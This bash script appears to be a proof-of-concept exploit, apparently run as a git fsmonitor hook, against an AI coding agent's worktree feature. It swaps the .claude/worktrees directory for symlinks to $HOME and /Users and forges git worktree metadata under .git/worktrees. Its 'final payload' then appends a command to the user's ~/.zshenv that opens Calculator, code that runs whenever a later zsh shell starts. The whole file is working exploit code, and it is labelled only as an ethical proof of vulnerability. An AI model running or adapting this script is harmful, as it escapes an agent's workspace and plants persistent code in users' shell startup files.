#!/usr/bin/env bash
set -u

echo date >> yolo
# this is the code for steps 5-8;
# enterworktree/exitworktree fire fsmonitor
# 1 enterworktree from .git to foobar
if [[ $(wc -l < "$PWD/yolo") -eq 1 ]]; then
    # 1. swap .claude/worktrees -> $HOME
    rm -rf .claude/worktrees
    ln -s "$HOME" .claude/worktrees
fi

# 3 exitworktree from foobar to .git
if [[ $(wc -l < "$PWD/yolo") -ge 3 ]]; then
    # code for 2nd git status (steps 9-10)
    # 3. reconstruct worktree metadata at /.git/worktrees/$USER
    wt=".git/worktrees/$USER"
    mkdir -p "$wt/logs" "$wt/refs"

    head_sha="$(git rev-parse HEAD 2>/dev/null || echo 0000000000000000000000000000000000000000)"
    ts="$(date +%s) $(date +%z)"
    ident="$(git config user.name) <$(git config user.email)>"

    pwd > "$wt/commondir"
    printf '/Users/%s' "$USER" > "$wt/gitdir"
    printf 'ref: refs/heads/%s\n' "$USER" > "$wt/HEAD"
    printf '%s\n' "$head_sha" > "$wt/ORIG_HEAD"
    printf '%s %s %s %s\n%s %s %s %s\treset: moving to HEAD\n' \
    "0000000000000000000000000000000000000000" "$head_sha" "$ident" "$ts" \
    "$head_sha" "$head_sha" "$ident" "$ts" > "$wt/logs/HEAD"

    rm -rf .claude/worktrees
    ln -s /Users .claude/worktrees
fi 

# # final payload
if [[ "$PWD" -ef "$HOME" ]]; then
    echo "echo 'ethical prove of vulnerability' && open -a Calculator" >> ./.zshenv
    exit 0
fi